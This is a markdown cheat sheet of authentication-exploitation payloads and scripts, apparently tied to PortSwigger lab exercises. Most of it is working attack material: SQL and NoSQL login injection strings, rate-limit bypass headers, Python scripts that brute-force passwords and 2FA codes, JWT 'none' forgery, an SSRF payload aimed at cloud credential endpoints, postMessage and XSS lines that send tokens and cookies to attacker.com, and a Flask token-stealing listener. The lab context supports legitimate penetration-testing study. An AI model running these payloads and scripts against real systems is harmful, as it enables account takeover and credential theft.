# Authentication Vulnerabilities - Complete Cheat Sheet

## Table of Contents
1. [Username Enumeration Payloads](#username-enumeration-payloads)
2. [Password Attack Payloads](#password-attack-payloads)
3. [Multi-Factor Authentication Bypasses](#multi-factor-authentication-bypasses)
4. [OAuth Exploitation](#oauth-exploitation)
5. [Session Management Attacks](#session-management-attacks)
6. [Password Reset Exploitation](#password-reset-exploitation)
7. [Burp Suite Commands](#burp-suite-commands)
8. [HTTP Headers for Testing](#http-headers-for-testing)
9. [Automation Scripts](#automation-scripts)

---

## Username Enumeration Payloads

### Error Message Analysis
```
Test usernames: admin, administrator, root, user, test, guest

Compare responses for:
- "Invalid username" vs "Incorrect password"
- Response length differences
- HTTP status codes (200 vs 401 vs 403)
- Redirect behavior
```

### Timing Attack Payloads
```python
# Use long passwords to amplify timing difference
password = "a" * 100  # or longer

# Valid users typically take 50-200ms longer
# due to password hash comparison
```

### Account Lock Enumeration
```
Method: Cluster Bomb attack
- Payload 1: Username list
- Payload 2: Null payload (5 iterations)

Look for: "Too many login attempts" only appears for valid users
```

### Common Username Wordlist
```
admin
administrator
root
user
test
guest
operator
support
backup
webmaster
carlos
wiener
peter
david
john
sarah
maria
```

---

## Password Attack Payloads

### Top Passwords to Test
```
password
123456
12345678
qwerty
abc123
monkey
1234567
letmein
trustno1
dragon
baseball
iloveyou
master
sunshine
ashley
bailey
shadow
superman
qazwsx
michael
football
```

### SQL Injection in Login
```sql
-- Username field
admin'--
admin' OR '1'='1
admin' OR '1'='1'--
admin' OR '1'='1'#
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
admin' UNION SELECT NULL--
admin' UNION SELECT NULL,NULL--

-- Password field
' OR '1'='1
' OR '1'='1'--
' OR 1=1--
password' OR '1'='1
```

### NoSQL Injection
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
```

### Brute-Force Bypass - IP Rotation
```http
X-Forwarded-For: 1.1.1.1
X-Forwarded-For: 1.1.1.2
X-Forwarded-For: 1.1.1.3
# Increment for each request
```

### Brute-Force Bypass - Counter Reset
```
Pitchfork attack pattern:
Username: your_user, target, your_user, target, your_user, target
Password: your_pass, test1, your_pass, test2, your_pass, test3
```

### Multiple Credentials Per Request
```json
{
  "username": "carlos",
  "password": [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon"
  ]
}
```

---

## Multi-Factor Authentication Bypasses

### Simple Bypass - URL Manipulation
```
After password login:
1. Redirected to: /login2 or /verify-2fa
2. Manually navigate to: /my-account or /dashboard
3. If access granted → 2FA bypass successful
```

### Parameter Manipulation
```http
POST /login2 HTTP/1.1
Host: target.com

mfa-code=1234&verify=carlos

# Manipulate 'verify' parameter to target other users
# Test with your valid code but victim's username
```

### Brute-Force 2FA Codes
```
Burp Intruder Configuration:
- Payload type: Numbers
- From: 0
- To: 9999
- Step: 1
- Min integer digits: 4
- Max integer digits: 4

Resource Pool: 1 concurrent request
Session handling: Macro for re-authentication
```

### Code Generation Endpoint Abuse
```http
GET /login2?verify=carlos HTTP/1.1

# Trigger code generation for target user
# Then brute-force the generated code
```

---

## OAuth Exploitation

### Implicit Flow Parameter Manipulation
```http
POST /authenticate HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "email": "victim@email.com",
  "username": "victim",
  "token": "YOUR_VALID_TOKEN"
}
```

### CSRF in Profile Linking
```html
<!-- Exploit server payload -->
<!DOCTYPE html>
<html>
<body>
<iframe src="https://target.com/oauth-linking?code=STOLEN_CODE"></iframe>
</body>
</html>
```

### redirect_uri Exploitation
```
# Directory Traversal
redirect_uri=https://target.com/oauth-callback/../admin
redirect_uri=https://target.com/oauth-callback/../post/comment/form

# External Domain
redirect_uri=https://attacker.com

# Subdomain
redirect_uri=https://evil.target.com

# Open Redirect Chain
redirect_uri=https://target.com/redirect?url=https://attacker.com
```

### PostMessage Token Theft
```html
<!DOCTYPE html>
<html>
<body>
<iframe src="https://oauth-server.com/auth?client_id=CLIENT_ID&redirect_uri=https://target.com/oauth-callback/../post/comment/comment-form&response_type=token&nonce=NONCE&scope=openid%20profile%20email"></iframe>

<script>
window.addEventListener('message', function(e) {
    fetch("/" + encodeURIComponent(e.data.data))
}, false)
</script>
</body>
</html>
```

### OpenID Dynamic Registration SSRF
```json
POST /reg HTTP/1.1
Host: oauth-server.com
Content-Type: application/json

{
  "redirect_uris": ["https://example.com"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

### Cloud Metadata Endpoints
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

---

## Session Management Attacks

### Stay-Logged-In Cookie Analysis
```
Cookie structure: base64(username:md5(password))

Decoding:
1. Base64 decode the cookie
2. Split on ':'
3. First part = username
4. Second part = MD5 hash of password

Attack:
1. Brute-force password
2. MD5 hash each attempt
3. Construct: username:hash
4. Base64 encode
5. Replace stay-logged-in cookie
```

### Cookie Construction
```python
import base64
import hashlib

username = "carlos"
password = "password123"

# MD5 hash the password
password_hash = hashlib.md5(password.encode()).hexdigest()

# Construct cookie value
cookie_value = f"{username}:{password_hash}"

# Base64 encode
cookie = base64.b64encode(cookie_value.encode()).decode()

print(f"stay-logged-in={cookie}")
```

### Session Fixation
```
1. Attacker gets session ID from application
2. Victim logs in with attacker's session ID
3. Attacker uses same session ID to access victim's account
```

### Session Hijacking via XSS
```javascript
// Cookie theft
<script>
document.location='//attacker.com/steal?c='+document.cookie
</script>

// Using fetch
<script>
fetch('//attacker.com/steal?c='+document.cookie)
</script>

// Using image
<img src=x onerror="this.src='//attacker.com/steal?c='+document.cookie">
```

### JWT Token Manipulation
```python
import jwt
import base64

# Decode JWT
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
decoded = jwt.decode(token, options={"verify_signature": False})

# Modify payload
decoded['sub'] = 'administrator'
decoded['role'] = 'admin'

# Re-encode with 'none' algorithm
token = jwt.encode(decoded, key=None, algorithm='none')

# Or brute-force weak secret
secrets = ['secret', 'password', 'jwt', 'key']
for secret in secrets:
    try:
        jwt.decode(token, secret, algorithms=['HS256'])
        print(f"Secret found: {secret}")
    except:
        continue
```

---

## Password Reset Exploitation

### Broken Token Validation
```http
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=&username=carlos&new-password=hacked123

# Try with:
# - Empty token
# - Removed token parameter
# - NULL token
# - Your own token with victim's username
```

### Host Header Poisoning
```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Host: attacker.com
X-Forwarded-For: attacker.com

username=victim
```

### Token Predictability Testing
```python
import hashlib
import time

# Test timestamp-based tokens
timestamp = int(time.time())
token = hashlib.md5(f"victim{timestamp}".encode()).hexdigest()

# Test sequential tokens
tokens = []
for i in range(5):
    # Request reset, capture token
    token = request_reset("test@example.com")
    tokens.append(token)

# Analyze for patterns
```

### Password Change Enumeration
```http
POST /change-password HTTP/1.1
Host: target.com

username=carlos&current-password=§payload§&new-password-1=123&new-password-2=abc

Response Analysis:
- "New passwords do not match" → Current password is CORRECT
- "Current password is incorrect" → Wrong password (no lockout!)
```

---

## Burp Suite Commands

### Intruder Attack Types

**Sniper**
```
Single payload position
Use for: Sequential testing of one parameter

Example:
POST /login
username=§payload§&password=test
```

**Battering Ram**
```
Same payload in all positions
Use for: Testing same value everywhere

Example:
POST /login
username=§payload§&password=§payload§
```

**Pitchfork**
```
Multiple positions, corresponding payloads
Use for: IP rotation, credential stuffing

Example:
X-Forwarded-For: §ip§
username=§username§&password=§password§

Payload sets:
Set 1 (IPs): 1.1.1.1, 1.1.1.2, 1.1.1.3
Set 2 (users): admin, test, user
Set 3 (passes): pass1, pass2, pass3
```

**Cluster Bomb**
```
All combinations of payloads
Use for: Full brute-force, account lock testing

Example:
username=§username§&password=§password§

Payload sets:
Set 1: [admin, test, user]
Set 2: [pass1, pass2, pass3]

Total requests: 3 × 3 = 9
```

### Payload Processing Rules

```
Order matters! Process in sequence:

1. Modify payload
   - Add prefix: "username:"
   - Add suffix: "@domain.com"

2. Hash
   - MD5
   - SHA-1
   - SHA-256

3. Encode
   - Base64
   - URL
   - HTML
```

### Grep Match and Extract

**Grep Match**
```
Settings → Grep - Match

Add strings to flag:
- "Welcome"
- "Logout"
- "Update email"
- "Administrator"
- "Incorrect password"
- "Invalid username"
```

**Grep Extract**
```
Settings → Grep - Extract

Extract error messages:
1. Start after: <div class="error">
2. End at: </div>
3. Useful for subtle differences
```

### Session Handling Macros

```
1. Settings → Sessions
2. Add Session Handling Rule
3. Scope: Include all URLs
4. Rule Actions: Run a macro

Macro steps (for 2FA brute-force):
Step 1: GET /login
Step 2: POST /login (username=carlos&password=montoya)
Step 3: GET /login2

This re-authenticates before each 2FA attempt
```

### Resource Pools

```
Settings → Resource Pools

Create new pool:
- Maximum concurrent requests: 1
- Delay between requests: 0ms

Use for:
- Session-based attacks
- 2FA brute-force
- Avoiding race conditions
```

---

## HTTP Headers for Testing

### Authentication Headers
```http
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Authorization: Digest username="admin", realm="Access"...
X-Auth-Token: abc123xyz789
X-API-Key: key_123456789
Cookie: session=abc123; stay-logged-in=xyz789
```

### IP Spoofing Headers
```http
X-Forwarded-For: 192.168.1.1
X-Originating-IP: 192.168.1.1
X-Remote-IP: 192.168.1.1
X-Remote-Addr: 192.168.1.1
X-Client-IP: 192.168.1.1
X-Real-IP: 192.168.1.1
True-Client-IP: 192.168.1.1
Cluster-Client-IP: 192.168.1.1
Forwarded: for=192.168.1.1
CF-Connecting-IP: 192.168.1.1 (Cloudflare)
```

### Host Header Manipulation
```http
Host: target.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
Forwarded: host=attacker.com
```

### User-Agent Rotation
```http
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)
Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X)
```

---

## Automation Scripts

### Username Enumeration Script
```python
#!/usr/bin/env python3
import requests
import time

target = "https://target.com/login"
usernames = ["admin", "administrator", "user", "test"]

print("[*] Testing username enumeration...")

for username in usernames:
    data = {"username": username, "password": "invalid"}

    start_time = time.time()
    response = requests.post(target, data=data)
    elapsed = time.time() - start_time

    print(f"[+] {username}: {response.status_code} - {len(response.text)} bytes - {elapsed:.3f}s")

    if "Incorrect password" in response.text:
        print(f"[!] Valid username found: {username}")
    elif "Invalid username" in response.text:
        print(f"[-] Invalid username: {username}")
```

### Password Brute-Force Script
```python
#!/usr/bin/env python3
import requests
from concurrent.futures import ThreadPoolExecutor

target = "https://target.com/login"
username = "carlos"
passwords = ["password", "123456", "admin", "letmein"]

def test_password(password):
    data = {"username": username, "password": password}
    response = requests.post(target, data=data, allow_redirects=False)

    if response.status_code == 302 or "Welcome" in response.text:
        return password
    return None

print(f"[*] Brute-forcing password for: {username}")

with ThreadPoolExecutor(max_workers=5) as executor:
    results = executor.map(test_password, passwords)

for result in results:
    if result:
        print(f"[!] Password found: {result}")
        break
```

### 2FA Brute-Force Script
```python
#!/usr/bin/env python3
import requests

target = "https://target.com/login2"
session = requests.Session()

# Login first
session.post("https://target.com/login",
    data={"username": "carlos", "password": "montoya"})

print("[*] Brute-forcing 2FA code...")

for code in range(10000):
    code_str = str(code).zfill(4)

    data = {"mfa-code": code_str}
    response = session.post(target, data=data, allow_redirects=False)

    if response.status_code == 302:
        print(f"[!] Valid code found: {code_str}")
        break

    if code % 100 == 0:
        print(f"[*] Tested {code}/10000 codes...")
```

### OAuth Token Stealer
```python
#!/usr/bin/env python3
from flask import Flask, request
import sys

app = Flask(__name__)

@app.route('/')
@app.route('/<path:path>')
def steal(path=''):
    # Log all requests
    print(f"[+] Received request: {request.url}")
    print(f"[+] Headers: {dict(request.headers)}")
    print(f"[+] Args: {dict(request.args)}")

    # Extract token from URL fragment (if present)
    full_url = request.url
    if '#' in full_url or 'access_token' in str(request.args):
        print(f"[!] POTENTIAL TOKEN: {full_url}")

    return "OK"

if __name__ == '__main__':
    print("[*] Starting OAuth token stealer on port 8080...")
    print("[*] Use this URL in redirect_uri or postMessage exploits")
    app.run(host='0.0.0.0', port=8080)
```

### Stay-Logged-In Cookie Cracker
```python
#!/usr/bin/env python3
import base64
import hashlib
import requests

target = "https://target.com/my-account"
username = "carlos"
passwords = ["password", "123456", "admin", "letmein"]

print(f"[*] Cracking stay-logged-in cookie for: {username}")

for password in passwords:
    # Generate cookie
    password_hash = hashlib.md5(password.encode()).hexdigest()
    cookie_value = f"{username}:{password_hash}"
    cookie = base64.b64encode(cookie_value.encode()).decode()

    # Test cookie
    cookies = {"stay-logged-in": cookie}
    response = requests.get(target, cookies=cookies)

    if response.status_code == 200 and "Update email" in response.text:
        print(f"[!] Password found: {password}")
        print(f"[!] Cookie: {cookie}")
        break

    print(f"[-] Trying: {password}")
```

### Host Header Poison Detector
```python
#!/usr/bin/env python3
import requests

target = "https://target.com/forgot-password"
test_host = "attacker.com"

headers = {
    "X-Forwarded-Host": test_host,
    "X-Host": test_host,
    "X-Forwarded-Server": test_host
}

data = {"username": "test@test.com"}

print("[*] Testing host header injection...")

response = requests.post(target, data=data, headers=headers)

if test_host in response.text:
    print(f"[!] VULNERABLE: Application reflects {test_host}")
    print("[!] Host header poisoning possible")
else:
    print("[-] Not vulnerable or host not reflected")
```

---

## Common Exploitation Patterns

### Pattern 1: Username Enumeration → Password Brute-Force
```
1. Enumerate valid usernames (via error messages/timing)
2. For each valid username:
   a. Test common passwords
   b. Test passwords from breaches
   c. Check for account lockout
   d. Rotate IPs if rate limited
```

### Pattern 2: 2FA Bypass via Parameter Manipulation
```
1. Login with valid credentials (your account)
2. Analyze 2FA verification request
3. Identify user identifier parameter (verify, user_id, etc.)
4. Modify parameter to target victim
5. Complete 2FA with your code → Access victim account
```

### Pattern 3: OAuth CSRF → Account Takeover
```
1. Initiate OAuth profile linking
2. Capture authorization code
3. Drop request (preserve code)
4. Create CSRF payload with stolen code
5. Victim clicks → Links your social profile to their account
6. Login with social media → Access victim account
```

### Pattern 4: Password Reset Token Bypass
```
1. Request password reset for your account
2. Analyze token structure and validation
3. Test with:
   - Empty token
   - Removed token
   - Your token + victim username
4. If validation bypassed → Reset victim password
```

### Pattern 5: Stay-Logged-In Cookie → Account Takeover
```
1. Analyze cookie structure (often base64)
2. Identify hashing algorithm (MD5, SHA-1)
3. Brute-force password with Burp Intruder:
   - Payload processing: Hash → Prefix → Encode
4. Use generated cookie to access account
```

---

## Testing Checklist

### Authentication Discovery
- [ ] Identify all authentication endpoints
- [ ] Map authentication flow
- [ ] Check for multiple auth methods (form, OAuth, API key)
- [ ] Identify session management mechanism
- [ ] Look for "remember me" functionality
- [ ] Find password reset workflow
- [ ] Check for 2FA/MFA

### Username Enumeration
- [ ] Test error message differences
- [ ] Test response length differences
- [ ] Test timing differences
- [ ] Test account lockout behavior
- [ ] Check registration page for enumeration
- [ ] Test password reset for username disclosure

### Password Attacks
- [ ] Test default credentials
- [ ] Test common passwords
- [ ] Test SQL injection in login
- [ ] Check for brute-force protection
- [ ] Test IP-based rate limiting
- [ ] Test account lockout mechanism
- [ ] Look for password complexity bypass

### Brute-Force Protection Bypasses
- [ ] Test X-Forwarded-For header
- [ ] Test other IP spoofing headers
- [ ] Test counter reset techniques
- [ ] Test multiple credentials per request
- [ ] Test CAPTCHA bypass
- [ ] Test distributed brute-force
- [ ] Test application-layer DoS

### Multi-Factor Authentication
- [ ] Test simple 2FA bypass (skip to protected page)
- [ ] Test parameter manipulation
- [ ] Test code reuse
- [ ] Test code prediction
- [ ] Test brute-force 2FA codes
- [ ] Test backup code enumeration
- [ ] Check for race conditions

### OAuth/SSO
- [ ] Test for state parameter
- [ ] Test redirect_uri validation
- [ ] Test parameter manipulation in callbacks
- [ ] Test CSRF in profile linking
- [ ] Test token leakage
- [ ] Test dynamic client registration
- [ ] Check for SSRF via logo_uri

### Session Management
- [ ] Test session fixation
- [ ] Test session hijacking
- [ ] Test cookie security flags
- [ ] Test stay-logged-in cookie structure
- [ ] Test JWT token manipulation
- [ ] Test session timeout
- [ ] Check for concurrent sessions

### Password Reset
- [ ] Test token validation
- [ ] Test token predictability
- [ ] Test token expiration
- [ ] Test token reuse
- [ ] Test host header poisoning
- [ ] Test parameter manipulation
- [ ] Check for information disclosure

### Business Logic
- [ ] Test authentication state machine
- [ ] Test role assignment logic
- [ ] Test privilege escalation
- [ ] Test race conditions
- [ ] Test account creation logic
- [ ] Test account recovery process

---

## References

### PortSwigger Resources
- Authentication Labs: https://portswigger.net/web-security/authentication
- OAuth Labs: https://portswigger.net/web-security/oauth
- Lab Usernames: https://portswigger.net/web-security/authentication/auth-lab-usernames
- Lab Passwords: https://portswigger.net/web-security/authentication/auth-lab-passwords

### OWASP Resources
- Authentication Testing: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/
- Authentication Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- Session Management: https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html

### Tools
- Burp Suite: https://portswigger.net/burp
- Hydra: https://github.com/vanhauser-thc/thc-hydra
- Patator: https://github.com/lanjelot/patator
- SecLists: https://github.com/danielmiessler/SecLists

---

*Complete cheat sheet for authentication vulnerability exploitation*
*All payloads, techniques, and automation scripts in one place*
